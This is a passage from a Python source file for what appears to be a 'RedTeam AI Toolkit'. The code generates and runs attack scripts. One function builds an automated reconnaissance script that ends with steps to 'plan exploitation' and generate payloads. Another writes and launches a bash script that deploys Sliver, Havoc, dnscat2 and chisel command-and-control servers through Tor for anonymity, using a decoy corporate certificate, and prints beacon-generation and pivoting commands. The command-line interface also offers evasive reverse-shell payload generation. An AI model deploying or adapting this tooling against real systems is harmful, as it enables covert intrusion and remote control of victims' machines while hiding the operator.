cat > "$OUTPUT_DIR/recon_summary.txt" << EOSUM
Reconnaissance Summary for: $TARGET
Session ID: {self.session_id}
Date: $(date)

Subdomains found: $(wc -l < "$OUTPUT_DIR/all_subdomains.txt" 2>/dev/null || echo "0")
Open ports: $(wc -l < "$OUTPUT_DIR/open_ports.txt" 2>/dev/null || echo "0")
HTTP services: $(wc -l < "$OUTPUT_DIR/http_services.txt" 2>/dev/null || echo "0")
Vulnerabilities: $(wc -l < "$OUTPUT_DIR/nuclei_results.txt" 2>/dev/null || echo "0")

Files generated:
- all_subdomains.txt: Complete subdomain list
- open_ports.txt: Open ports and services
- http_services.txt: HTTP/HTTPS services
- nuclei_results.txt: Vulnerability scan results
- emails.json: Email addresses found
- gobuster_*.txt: Directory enumeration results

Next steps:
1. Review vulnerability scan results in nuclei_results.txt
2. Manually verify high-value targets
3. Plan exploitation based on findings
4. Generate targeted payloads using: python3 ai_modules/toolkit_ai.py --generate-payload
EOSUM

echo "✅ Reconnaissance completed for $TARGET"
echo "📁 Results saved to: $OUTPUT_DIR"
echo "📋 Summary: $OUTPUT_DIR/recon_summary.txt"

# AI analysis integration
python3 "$TOOLS_DIR/ai_modules/toolkit_ai.py" --target "$TARGET" > "$OUTPUT_DIR/ai_analysis.json" || true

echo "🤖 AI analysis saved to: $OUTPUT_DIR/ai_analysis.json"
"""
        
        script_path = self.base_dir / "temp" / f"auto_recon_{target}_{self.session_id}.sh"
        script_path.parent.mkdir(exist_ok=True)
        
        with open(script_path, 'w') as f:
            f.write(recon_script)
            
        os.chmod(script_path, 0o755)
        return str(script_path)

    def generate_c2_deployment_script(self) -> str:
        """Generate comprehensive C2 deployment script"""
        self.logger.info("🌐 Generating C2 deployment script...")
        
        # Generate Havoc profile using Python string formatting
        havoc_profile = """Teamserver {{
    Host = "{host}"
    Port = {port}

    Build {{
        Compiler64 = "{gcc64}"
        Compiler86 = "{gcc86}"
        Nasm = "{nasm}"
    }}
}}

Operators {{
    user = "redteam"
    password = "$(openssl rand -hex 16)"
}}

Demon {{
    Sleep = 2
    Jitter = 15
    TrustXForwardedFor = false
    
    Binary {{
        Header = ".text"
    }}
}}""".format(
            host="127.0.0.1",
            port=40056,
            gcc64="/usr/bin/x86_64-w64-mingw32-gcc",
            gcc86="/usr/bin/i686-w64-mingw32-gcc",
            nasm="/usr/bin/nasm"
        )
        
        c2_script = f"""#!/bin/bash
# AI-Generated C2 Deployment Script  
# Session: {self.session_id}
# Generated: {datetime.now().isoformat()}

set -euo pipefail

TOOLS_DIR="$HOME/redteam_tools"
SESSION_ID="{self.session_id}"

echo "🌐 Deploying comprehensive C2 infrastructure..."

# Start Tor service for anonymity
echo "🔒 Starting Tor service..."
sudo systemctl start tor
sleep 10

# Get Tor hidden service address
TOR_ADDRESS=$(sudo cat /var/lib/tor/redteam_service/hostname 2>/dev/null || echo "Not configured")

# Generate SSL certificates for HTTPS C2
echo "🔧 Generating SSL certificates..."
mkdir -p /tmp/c2_certs_$SESSION_ID
cd /tmp/c2_certs_$SESSION_ID

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\
    -subj "/C=US/ST=California/L=San Francisco/O=TechCorp/CN=api.techcorp-internal.com" \\
    -keyout c2_server.key -out c2_server.crt

# Deploy Sliver C2 (Primary)
echo "🔥 Deploying Sliver C2 (Primary)..."
if command -v sliver-server >/dev/null 2>&1; then
    cat > sliver_config_$SESSION_ID.json << EOSLIVER
{{
    "operator": "redteam_$SESSION_ID",
    "lhost": "127.0.0.1", 
    "lport": 8443,
    "cert": "$(pwd)/c2_server.crt",
    "key": "$(pwd)/c2_server.key",
    "persistent": true,
    "timeout": 60
}}
EOSLIVER

    # Start Sliver server in background
    sliver-server --config sliver_config_$SESSION_ID.json &
    SLIVER_PID=$!
    echo "Sliver PID: $SLIVER_PID" > /tmp/c2_pids_$SESSION_ID.txt
    sleep 5
fi

# Deploy Havoc C2 (Backup)
echo "🔄 Deploying Havoc C2 (Backup)..."
if [ -d "$TOOLS_DIR/c2/Havoc" ]; then
    cd "$TOOLS_DIR/c2/Havoc"
    
    # Create Havoc profile
    cat > profiles/backup_$SESSION_ID.yaotl << 'EOHAVOC'
{havoc_profile}
EOHAVOC

    # Start Havoc server
    ./havoc server --profile profiles/backup_$SESSION_ID.yaotl &
    HAVOC_PID=$!
    echo "Havoc PID: $HAVOC_PID" >> /tmp/c2_pids_$SESSION_ID.txt
    cd - >/dev/null
fi

# Setup DNS C2 tunnel (Tertiary)
echo "🌐 Setting up DNS C2 tunnel..."
if [ -d "$TOOLS_DIR/c2/dnscat2" ]; then
    cd "$TOOLS_DIR/c2/dnscat2/server"
    
    # Start dnscat2 server
    ruby dnscat2.rb --dns port=5353 --security=open \\
        --secret=$(openssl rand -hex 16) &
    DNSCAT_PID=$!
    echo "DNScat2 PID: $DNSCAT_PID" >> /tmp/c2_pids_$SESSION_ID.txt
    cd - >/dev/null
fi

# Setup reverse proxy through Tor
echo "🕸️  Setting up Tor reverse proxy..."
if command -v chisel >/dev/null 2>&1; then
    # Start chisel server for tunneling
    chisel server --reverse --port 9999 &
    CHISEL_PID=$!
    echo "Chisel PID: $CHISEL_PID" >> /tmp/c2_pids_$SESSION_ID.txt
fi

# Generate deployment summary
cat > "$TOOLS_DIR/c2/deployment_$SESSION_ID.txt" << EODEPLOY
C2 Infrastructure Deployment Summary
====================================
Session ID: $SESSION_ID
Deployment Time: $(date)

Primary C2: Sliver
- Protocol: HTTPS
- Port: 8443
- Status: $(ps -p $SLIVER_PID >/dev/null 2>&1 && echo "Running" || echo "Failed")

Backup C2: Havoc  
- Protocol: HTTPS
- Port: 40056
- Status: $(ps -p $HAVOC_PID >/dev/null 2>&1 && echo "Running" || echo "Failed")

DNS C2: DNScat2
- Protocol: DNS
- Port: 5353
- Status: $(ps -p $DNSCAT_PID >/dev/null 2>&1 && echo "Running" || echo "Failed")

Tunneling: Chisel
- Port: 9999
- Status: $(ps -p $CHISEL_PID >/dev/null 2>&1 && echo "Running" || echo "Failed")

Tor Configuration:
- Hidden Service: $TOR_ADDRESS
- Status: $(systemctl is-active tor)

SSL Certificates: /tmp/c2_certs_$SESSION_ID/

Process IDs saved to: /tmp/c2_pids_$SESSION_ID.txt

Usage Examples:
===============

Sliver Client Connection:
sliver-client --config sliver_config_$SESSION_ID.json

Generate Sliver Beacon:
generate beacon --http 127.0.0.1:8443 --os windows --arch amd64 --save beacon.exe

Chisel Client (for pivoting):
chisel client 127.0.0.1:9999 R:8080:127.0.0.1:8080

DNScat2 Client:
dnscat2 --dns server=127.0.0.1:5353

Cleanup Command:
kill \\$(cat /tmp/c2_pids_$SESSION_ID.txt) && rm /tmp/c2_pids_$SESSION_ID.txt
EODEPLOY

echo "✅ C2 infrastructure deployment completed!"
echo "📋 Deployment details: $TOOLS_DIR/c2/deployment_$SESSION_ID.txt"
echo "🔗 Tor Hidden Service: $TOR_ADDRESS"
echo "🔒 All traffic routed through Tor for anonymity"
"""
        
        script_path = self.base_dir / "temp" / f"deploy_c2_{self.session_id}.sh"
        with open(script_path, 'w') as f:
            f.write(c2_script)
            
        os.chmod(script_path, 0o755)
        return str(script_path)

    def launch_interactive_menu(self):
        """Launch the interactive CLI menu"""
        self.logger.info("🚀 Launching interactive RedTeam menu...")
        
        if not self.menu_script.exists():
            self.logger.error("❌ Interactive menu script not found")
            return False
            
        try:
            # Make menu script executable
            os.chmod(self.menu_script, 0o755)
            
            # Launch interactive menu
            result = subprocess.run(["/bin/bash", str(self.menu_script)], cwd=self.base_dir)
            return result.returncode == 0
            
        except Exception as e:
            self.logger.error(f"❌ Menu launch error: {str(e)}")
            return False

    def get_session_summary(self) -> Dict:
        """Generate session summary for reporting"""
        return {
            "session_id": self.session_id,
            "start_time": datetime.now().isoformat(),
            "toolkit_status": self.tool_status,
            "config_summary": {
                "opsec_enabled": self.config["opsec"]["tor_required"],
                "tools_installed": len([t for t in self.tool_status.values() if t == "installed"]),
                "encryption_keys_generated": len(self.config["evasion"]["encryption_keys"])
            }
        }

    def print_colored(self, text: str, color: str = "WHITE", bold: bool = False, end: str = "\n"):
        """Print colored text to terminal with support for end parameter"""
        color_code = self.config.get("COLORS", {}).get(color.upper(), "\033[37m")  # Default to white
        bold_code = "\033[1m" if bold else ""
        reset_code = "\033[0m"
        print(f"{bold_code}{color_code}{text}{reset_code}", end=end)

def main():
    parser = argparse.ArgumentParser(description="RedTeam AI Toolkit - Advanced Edition")
    parser.add_argument("--setup", action="store_true", help="Initialize toolkit")
    parser.add_argument("--target", type=str, help="Target for analysis")
    parser.add_argument("--generate-payload", type=str, help="Generate payload for OS")
    parser.add_argument("--payload-type", type=str, default="reverse_shell")
    parser.add_argument("--lhost", type=str, help="Listener host")
    parser.add_argument("--lport", type=int, help="Listener port")
    parser.add_argument("--install-tools", action="store_true", help="Auto-install missing tools")
    parser.add_argument("--full-install", action="store_true", help="Run comprehensive installation")
    parser.add_argument("--generate-recon", type=str, help="Generate reconnaissance script for target")
    parser.add_argument("--deploy-c2", action="store_true", help="Deploy C2 infrastructure")
    parser.add_argument("--cleanup", action="store_true", help="Run cleanup procedures")
    parser.add_argument("--menu", action="store_true", help="Launch interactive menu")
    parser.add_argument("--session-summary", action="store_true", help="Show session summary")
    
    args = parser.parse_args()
    
    ai_toolkit = RedTeamAI()
    
    if args.setup:
        ai_toolkit.logger.info("🚀 RedTeam AI Toolkit initialized successfully")
        print("✅ Toolkit setup complete")
        
    if args.menu:
        ai_toolkit.launch_interactive_menu()
        
    if args.session_summary:
        summary = ai_toolkit.get_session_summary()
        print(json.dumps(summary, indent=2))
        
    if args.full_install:
        success = ai_toolkit.run_full_installation()
        if success:
            print("✅ Full installation completed successfully")
        else:
            print("❌ Installation failed - check logs for details")
            
    if args.install_tools:
        ai_toolkit.auto_install_missing_tools()
        
    if args.target:
        analysis = ai_toolkit.ai_target_analysis(args.target)
        print(json.dumps(analysis, indent=2))
        
    if args.generate_recon:
        script_path = ai_toolkit.generate_automated_recon_script(args.generate_recon)
        print(f"🔍 Reconnaissance script generated: {script_path}")
        
    if args.deploy_c2:
        script_path = ai_toolkit.generate_c2_deployment_script()
        print(f"🌐 C2 deployment script generated: {script_path}")
        
    if args.generate_payload:
        script_path = ai_toolkit.generate_evasive_payload(
            args.generate_payload, 
            args.payload_type,
            args.lhost,
            args.lport
        )
        print(f"📦 Advanced payload generation script: {script_path}")

    if args.cleanup:
        cleanup_script = ai_toolkit.base_dir / "payloads" / "generated" / f"cleanup_{ai_toolkit.session_id}.sh"
        if cleanup_script.exists():
            subprocess.run(["/bin/bash", str(cleanup_script)])
            print("🧹 Cleanup completed")

if __name__ == "__main__":
    main()
